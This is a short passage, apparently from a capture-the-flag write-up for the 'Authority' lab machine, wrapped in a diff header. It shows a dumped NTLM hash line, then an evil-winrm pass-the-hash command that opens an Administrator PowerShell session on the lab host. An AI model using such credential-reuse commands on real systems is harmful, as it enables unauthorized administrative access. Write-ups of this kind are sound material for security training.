@@ -1,0 +1,1 @@
+ad3b435b51404eeaad3b435b51404ee:81cebe41108f5b1c36f3dd3c01dccfc3::: [*] Cleaning up... That hash works over Evil-WinRM: oxdf@hacky$ evil-winrm -i authority.htb -u administrator -H 6961f422924da90a6928197429eea4ed Evil-WinRM shell v3.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents>
